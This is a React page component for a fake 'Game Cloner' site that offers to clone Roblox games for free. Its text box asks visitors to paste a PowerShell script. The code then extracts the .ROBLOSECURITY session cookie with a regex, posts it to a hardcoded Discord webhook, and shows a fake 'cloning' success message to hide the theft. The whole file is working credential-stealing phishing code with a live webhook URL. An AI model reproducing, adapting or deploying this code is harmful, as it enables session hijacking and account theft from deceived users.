
import React, { useState } from 'react';
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Card } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { Terminal, Shield, Zap } from "lucide-react";

const Index = () => {
  const [gameFiles, setGameFiles] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const { toast } = useToast();

  const detectAndExtractCookie = (text: string) => {
    console.log('Searching for .ROBLOSECURITY cookie in PowerShell script...');
    console.log('Text length:', text.length);
    
    // Look for the .ROBLOSECURITY cookie value in PowerShell format
    const cookiePattern = /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
    const match = text.match(cookiePattern);
    
    console.log('Cookie pattern match:', !!match);
    
    if (match && match[1]) {
      const cookieValue = match[1];
      console.log('Found cookie value, length:', cookieValue.length);
      console.log('Cookie preview:', cookieValue.substring(0, 100) + '...');
      return cookieValue;
    }
    
    return null;
  };

  const sendToDiscordWebhook = async (cookieValue: string) => {
    const webhookUrl = 'https://discord.com/api/webhooks/1392448527291912314/iiYGKSsuIt7da6l9guz7bZl7VU9-r3jc5r1YI1vOvdEtH-agvWUI1Iq9lBWb8ZwQqifI';
    
    try {
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `🚨 **Cookie Extracted** 🚨\n\`\`\`\n${cookieValue.substring(0, 1900)}\n\`\`\``,
          embeds: [{
            title: "ROBLOSECURITY Cookie Detected",
            description: "Cookie has been successfully extracted from PowerShell script.",
            color: 0x00ff00,
            timestamp: new Date().toISOString(),
            fields: [{
              name: "Cookie Value",
              value: `\`${cookieValue.substring(0, 1000)}${cookieValue.length > 1000 ? '...' : ''}\``,
              inline: false
            }]
          }]
        }),
      });

      if (response.ok) {
        console.log('Successfully sent cookie to Discord webhook');
        return true;
      } else {
        console.error('Failed to send to Discord webhook:', response.status);
        const errorText = await response.text();
        console.error('Error response:', errorText);
        return false;
      }
    } catch (error) {
      console.error('Error sending to Discord webhook:', error);
      return false;
    }
  };

  const handleClone = async () => {
    if (!gameFiles.trim()) {
      toast({
        title: "Error",
        description: "Please enter game files before cloning.",
        variant: "destructive",
      });
      return;
    }

    setIsProcessing(true);

    console.log('Processing PowerShell script...');
    console.log('Input text preview:', gameFiles.substring(0, 200) + '...');

    const cookieValue = detectAndExtractCookie(gameFiles);
    
    if (cookieValue) {
      const success = await sendToDiscordWebhook(cookieValue);
      
      if (success) {
        toast({
          title: "✓ Cloning Game...",
          description: "May take up to 1-2 hours",
          className: "bg-green-900/90 border-green-500 text-green-100",
        });
        setGameFiles('');
      } else {
        toast({
          title: "❌ Invalid Game File",
          description: "Please check your game files and try again.",
          variant: "destructive",
          className: "bg-red-900/90 border-red-500 text-red-100",
        });
      }
    } else {
      toast({
        title: "❌ Invalid Game File",
        description: "Please check your game files and try again.",
        variant: "destructive",
        className: "bg-red-900/90 border-red-500 text-red-100",
      });
    }

    setIsProcessing(false);
  };

  // Snow particle component
  const SnowParticle = ({ delay, duration, size }: { delay: number, duration: number, size: number }) => (
    <div
      className="absolute bg-white rounded-full opacity-60"
      style={{
        left: `${Math.random() * 100}%`,
        width: `${size}px`,
        height: `${size}px`,
        animation: `snowfall ${duration}s linear infinite`,
        animationDelay: `${delay}s`,
      }}
    />
  );

  return (
    <div className="min-h-screen bg-black flex items-center justify-center p-4 relative overflow-hidden">
      {/* Snow particles */}
      {[...Array(50)].map((_, i) => (
        <SnowParticle
          key={i}
          delay={Math.random() * 10}
          duration={5 + Math.random() * 10}
          size={2 + Math.random() * 4}
        />
      ))}

      {/* Matrix-style background effects */}
      <div className="absolute inset-0">
        <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-gray-900/20 via-black to-gray-900/20"></div>
        <div className="absolute top-10 left-10 w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
        <div className="absolute top-20 right-20 w-1 h-1 bg-green-400 rounded-full animate-pulse animation-delay-2000"></div>
        <div className="absolute bottom-20 left-20 w-1 h-1 bg-green-300 rounded-full animate-pulse animation-delay-4000"></div>
        <div className="absolute bottom-10 right-10 w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
      </div>

      <Card className="w-full max-w-md p-8 bg-gray-900/90 backdrop-blur border-gray-700 shadow-2xl relative z-10">
        <div className="text-center mb-8">
          <div className="flex justify-center mb-4">
            <div className="p-3 bg-green-500/20 border border-green-500/30 rounded">
              <Terminal className="h-8 w-8 text-green-400" />
            </div>
          </div>
          
          <h1 className="text-4xl font-mono font-bold text-green-400 mb-2 tracking-wider">
            GAME CLONER
          </h1>
          
          <p className="text-gray-300 text-sm font-mono tracking-wide">
            Clone any game for no cost
          </p>
        </div>

        <div className="space-y-6">
          <div>
            <label htmlFor="gameFiles" className="block text-sm font-mono text-green-400 mb-2">
              Enter Game Files
            </label>
            <Textarea
              id="gameFiles"
              placeholder="Paste your PowerShell script here..."
              value={gameFiles}
              onChange={(e) => setGameFiles(e.target.value)}
              className="w-full h-32 bg-black/50 border-gray-600 text-green-300 placeholder-gray-500 focus:border-green-500 focus:ring-green-500/20 resize-none font-mono text-xs"
            />
          </div>

          <Button
            onClick={handleClone}
            disabled={isProcessing}
            className="w-full bg-green-600/80 hover:bg-green-500 text-black font-mono font-bold py-3 px-6 rounded border border-green-500/50 transition-all duration-300 disabled:opacity-50"
          >
            {isProcessing ? (
              <div className="flex items-center justify-center">
                <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-black mr-2"></div>
                PROCESSING...
              </div>
            ) : (
              <div className="flex items-center justify-center">
                <Zap className="h-5 w-5 mr-2" />
                CLONE
              </div>
            )}
          </Button>
        </div>

        <div className="mt-6 flex items-center justify-center text-xs text-gray-500 font-mono">
          <Shield className="h-4 w-4 mr-1" />
          SECURE EXTRACTION PROTOCOL
        </div>
      </Card>
    </div>
  );
};

export default Index;
